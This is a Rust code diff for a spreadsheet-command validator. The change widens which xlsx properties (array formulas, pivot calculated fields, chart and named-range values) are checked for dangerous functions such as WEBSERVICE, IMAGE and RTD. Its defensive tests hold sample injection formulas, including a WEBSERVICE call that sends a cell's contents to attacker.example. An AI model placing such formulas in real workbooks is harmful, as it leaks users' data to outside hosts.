@@ -596,13 +596,34 @@ const FORMULA_FUNCTIONS: &[&str] = &[
 /// Families refused by their names' start: CUBEVALUE, CUBEMEMBER, CUBESET…
 /// read an OLAP server.
 const FORMULA_FAMILIES: &[&str] = &["CUBE"];
-/// The xlsx properties officecli writes as a formula whatever they hold
-/// (`ref` and `refersTo` are a named range's formula).
-const FORMULA_KEYS: &[&str] = &["formula", "formula1", "formula2", "refersto", "ref"];
-/// The xlsx elements whose values may be formulas without a leading `=`, by
-/// `type` or in a path (`/Sheet1/cf[1]`), named in lower case without `-`
-/// and `_`: conditional formats (a `cellis` value is a formula),
-/// validations, named ranges, charts, sparklines and tables.
+/// The parts of a property's name (in lower case, without `-` and `_`) that
+/// make it a formula wherever it is, besides any part that holds `formula`
+/// (`formula1`, `arrayFormula`, `sharedFormula`…): a named range's `ref`
+/// and `refersTo`, a pivot table's `calculatedField`.
+const FORMULA_KEYS: &[&str] = &["ref", "refersto", "calculatedfield", "calculatedfields"];
+/// On a [`FORMULA_TARGETS`] element, the parts of a property's name that
+/// make it hold a reference or a formula, when one of its parts contains
+/// one (`dataRange`, `valuesRef`, `value2`). Its other properties (`title`,
+/// `name`, `columns`, `prompt`…) are text, read as a formula only when they
+/// start like one.
+const REFERENCE_PARTS: &[&str] = &[
+    "formula",
+    "ref",
+    "sqref",
+    "range",
+    "values",
+    "categories",
+    "value",
+    "source",
+    "data",
+    "refersto",
+    "calculatedfield",
+];
+/// The xlsx elements whose references and values may be formulas without a
+/// leading `=`, by `type` or in a path (`/Sheet1/cf[1]`), named in lower
+/// case without `-` and `_`: conditional formats (a `cellis` value is a
+/// formula), validations, named ranges (`name` is officecli's alias),
+/// charts, sparklines, tables and pivot tables.
 const FORMULA_TARGETS: &[&str] = &[
     "cf",
     "conditionalformatting",
@@ -622,11 +643,13 @@ const FORMULA_TARGETS: &[&str] = &[
     "datavalidation",
     "namedrange",
     "definedname",
+    "name",
     "chart",
     "chartseries",
     "chartaxis",
     "sparkline",
     "table",
+    "pivottable",
 ];
 /// What starts a formula: Excel reads a leading `+`, `-` or `@` as `=`
 /// (a value that is a number is none).
@@ -637,10 +660,11 @@ const WORKBOOK_EXTENSIONS: &[&str] = &[
     ".xls", ".xlsx", ".xlsm", ".xlsb", ".xla", ".xlam", ".xlt", ".xltx", ".xltm", ".ods", ".csv",
 ];
 
-/// The formulas of an xlsx batch (R50, R53, R54). Any value that starts
+/// The formulas of an xlsx batch (R50, R53, R54, R56). Any value that starts
 /// like a formula is one, whatever its key or element; so is any value of a
-/// [`FORMULA_KEYS`] key or of an item on a [`FORMULA_TARGETS`] element. A
-/// formula calls only [`FORMULA_ALLOWED`] functions, holds none of
+/// formula key (see [`is_formula_key`]), and of a [`REFERENCE_PARTS`] key on
+/// a [`FORMULA_TARGETS`] element. A formula calls only [`FORMULA_ALLOWED`]
+/// functions, holds none of
 /// [`FORMULA_FUNCTIONS`], no DDE link, no other workbook, and no file share
 /// or address outside HYPERLINK's quoted link. A table's inline rows hold
 /// values only. Excel evaluates what passes: formulas are filtered, not
@@ -658,17 +682,24 @@ fn check_formulas(commands: &[Value]) -> Result<(), String> {
             let Some(text) = value.as_str() else {
                 continue;
             };
-            let lower = key.to_ascii_lowercase();
-            let last = lower.rsplit('.').next().unwrap_or(&lower);
-            // A table's rows as a whole only when they start like one: they
-            // may hold addresses and any word.
-            let data = lower == "data";
-            let formula = starts_like_a_formula(text)
-                || (!data && (targeted || FORMULA_KEYS.contains(&last)));
-            let why = formula
-                .then(|| refused_formula(text))
-                .flatten()
-                .or_else(|| data.then(|| refused_data_cells(text)).flatten());
+            let name: String = key
+                .chars()
+                .filter(|c| !matches!(c, '-' | '_'))
+                .collect::<String>()
+                .to_ascii_lowercase();
+            let parts: Vec<&str> = name.split('.').collect();
+            let reference = targeted
+                && parts
+                    .iter()
+                    .any(|part| REFERENCE_PARTS.iter().any(|word| part.contains(word)));
+            let why = if is_formula_key(&parts) || reference {
+                refused_formula(text)
+            } else if starts_like_a_formula(text) {
+                refused_formula(text).map(|why| read_as_a_formula(text, &why))
+            } else {
+                None
+            };
+            let why = why.or_else(|| (name == "data").then(|| refused_data_cells(text)).flatten());
             if let Some(why) = why {
                 return Err(refuse(
                     FAILED,
@@ -678,6 +709,25 @@ fn check_formulas(commands: &[Value]) -> Result<(), String> {
         }
     }
     Ok(())
+}
+
+/// Whether a property named by `parts` (its name in lower case, without `-`
+/// and `_`, split at `.`) is a formula whatever it holds: a part holds
+/// `formula`, or is one of [`FORMULA_KEYS`].
+fn is_formula_key(parts: &[&str]) -> bool {
+    parts
+        .iter()
+        .any(|part| part.contains("formula") || FORMULA_KEYS.contains(part))
+}
+
+/// Why text that starts like a formula is refused: it is read as one, and
+/// a leading apostrophe keeps it text (officecli stores `'+1 555` as the
+/// text `+1 555`, marked for Excel to show as typed).
+fn read_as_a_formula(text: &str, why: &str) -> String {
+    let first = text.trim_start().chars().next().unwrap_or('=');
+    format!(
+        "starts with {first}, so it is read as a formula, and it {why}. To keep it as text, start the value with an apostrophe (') — Excel shows the text without it"
+    )
 }
 
 /// Whether Excel would read `text` as a formula: after any leading
@@ -4058,7 +4108,7 @@ esac"#,
                 "WEBSERVICE",
             ),
             (
-                json!({"command": "add", "parent": "/Sheet1", "type": "Chart-Series", "props": {"name": "INDIRECT(B2)"}}),
+                json!({"command": "add", "parent": "/Sheet1", "type": "Chart-Series", "props": {"values": "INDIRECT(B2)"}}),
                 "INDIRECT",
             ),
             (
@@ -4066,9 +4116,10 @@ esac"#,
                 "INDIRECT",
             ),
             // R53: a table's rows hold values.
+            // (A table's data is a reference-bearing key: read whole first.)
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B3", "data": "Name,Value\nA,=WEBSERVICE(B2)"}}),
-                "table rows hold values only",
+                "calls WEBSERVICE",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name;@x"}}),
@@ -4097,11 +4148,50 @@ esac"#,
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name\tValue\nA\t=WEBSERVICE(B2)"}}),
+                "calls WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "/Sheet1/A1", "props": {"data": "Name\tValue\nA\t=SUM(B2)"}}),
                 "table rows hold values only",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "=EVALUATE(B2),2"}}),
                 "calls EVALUATE",
+            ),
+            // R56: any key with `formula` in it, whatever its case.
+            (
+                json!({"command": "set", "path": "/Sheet1/B1", "props": {"arrayformula": "WEBSERVICE(\"https://attacker.example/?q=\"&A1)", "ref": "B1"}}),
+                "calls WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "/Sheet1/B1", "props": {"arrayFormula": "IMAGE(A1)", "ref": "B1"}}),
+                "calls IMAGE",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "cell", "props": {"arrayformula": "WEBSERVICE(A1)", "ref": "C1"}}),
+                "calls WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "/Sheet1/B1", "props": {"shared_Formula": "RTD(A1)"}}),
+                "calls RTD",
+            ),
+            // R56: pivot tables, and `name` as a named range.
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "pivottable", "props": {"position": "H1", "calculatedField": "Net Margin:=WEBSERVICE(B2)"}}),
+                "calls WEBSERVICE",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "pivotTable", "props": {"position": "H1", "values": "IMAGE(B2)"}}),
+                "calls IMAGE",
+            ),
+            (
+                json!({"command": "add", "parent": "/", "type": "name", "props": {"name": "feed", "value": "WEBSERVICE(B2)"}}),
+                "calls WEBSERVICE",
+            ),
+            // R56: a chart's text that starts like a formula is one.
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "=WEBSERVICE(\"https://x.example/\")"}}),
+                "calls WEBSERVICE",
             ),
         ] {
             let error = workbook(std::slice::from_ref(&item)).unwrap_err();
@@ -4160,8 +4250,16 @@ esac"#,
         }
         for item in [
             json!({"command": "add", "parent": "/Sheet1", "type": "cellis", "props": {"ref": "A1:A10", "operator": "greaterThan", "value": "50", "fill": "FFFF00"}}),
-            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "name": "Sales", "data": "Name,Delta,Share\nNorth,-3.5,+2\nSouth,4,\"-0.25\"\nWest,1e3,https://example.com"}}),
+            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "name": "Sales", "data": "Name,Delta,Share\nNorth,-3.5,+2\nSouth,4,\"-0.25\"\nWest,1e3,7"}}),
             json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue"}}),
+            // R56: the text of a chart, table or validation is no formula
+            // unless it starts like one.
+            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue (USD)"}}),
+            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "line", "data": "Calls:10,20,30;Cost:5,8,12", "categories": "Q1,Q2,Q3", "title": "Call volume", "axistitle": "Amount (k)", "catTitle": "Quarter (2026)", "series1.name": "Sales (2026)"}}),
+            json!({"command": "set", "path": "/Sheet1/chart[1]", "props": {"title": "销售额 (万元)"}}),
+            json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"name": "Sales (2026)", "values": "Sheet1!B2:B5"}}),
+            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "name": "Ledger", "columns": "Name,Amount (USD),Date"}}),
+            json!({"command": "add", "parent": "/Sheet1", "type": "validation", "props": {"ref": "B2:B9", "type": "list", "formula1": "Yes,No", "prompt": "Pick one (required)", "errorTitle": "Wrong value (see list)", "error": "Call support (ext. 12)"}}),
         ] {
             workbook(std::slice::from_ref(&item)).unwrap_or_else(|error| panic!("{item}: {error}"));
         }
@@ -4171,9 +4269,27 @@ esac"#,
             json!({"command": "set", "path": "/Chart/A1", "props": {"value": "See https://example.com"}}),
         ])
         .unwrap();
-        // Every formula the bundled skills teach.
-        let commands: Vec<Value> =
-            serde_json::from_str(include_str!("testdata/skill-batches.json")).unwrap();
+        // Every formula the bundled skills teach, and a chart titled as the
+        // xlsx skill asks: with its unit in parentheses.
+        // (Only the workbook commands: Word and PowerPoint tables are prose.)
+        let mut commands: Vec<Value> =
+            serde_json::from_str::<Vec<Value>>(include_str!("testdata/skill-batches.json"))
+                .unwrap()
+                .into_iter()
+                .filter(|item| {
+                    ELEMENT_FIELDS.iter().all(|field| {
+                        let root = item[*field]
+                            .as_str()
+                            .and_then(|path| path.strip_prefix('/'))
+                            .and_then(|path| path.split(['/', '[']).next())
+                            .unwrap_or_default()
+                            .to_ascii_lowercase();
+                        root == "sheet" || !ROOTS.contains(&root.as_str())
+                    })
+                })
+                .collect();
+        assert!(commands.len() > 30, "{}", commands.len());
+        commands.push(json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue (USD)"}}));
         check_formulas(&commands).unwrap();
         // Formulas are checked in workbooks only: a Word equation's `|x|`
         // and `\\` are maths.
@@ -4183,6 +4299,35 @@ esac"#,
             content: json!([{"command": "add", "parent": "/body", "type": "equation", "props": {"formula": r"|x| \\ y"}}]),
         })
         .unwrap();
+    }
+
+    #[test]
+    fn text_that_starts_like_a_formula_says_how_to_keep_it_text() {
+        for (text, first) in [
+            ("+1 (555) 010-0100", '+'),
+            ("- Review contract (legal)", '-'),
+            ("=WEBSERVICE(B2)", '='),
+        ] {
+            let error = workbook(&[cell(json!({"value": text}))]).unwrap_err();
+            assert!(
+                error.contains(&format!(
+                    "starts with {first}, so it is read as a formula, and it "
+                )) && error.contains("start the value with an apostrophe (')"),
+                "{text}: {error}"
+            );
+        }
+        // officecli keeps a value after an apostrophe as text.
+        for text in [
+            "'+1 (555) 010-0100",
+            "'- Review contract (legal)",
+            "'=WEBSERVICE(B2)",
+        ] {
+            workbook(&[cell(json!({"value": text}))])
+                .unwrap_or_else(|error| panic!("{text}: {error}"));
+        }
+        // A formula key is a formula: no apostrophe helps.
+        let error = workbook(&[cell(json!({"formula": "WEBSERVICE(B2)"}))]).unwrap_err();
+        assert!(!error.contains("apostrophe"), "{error}");
     }
 
     #[test]
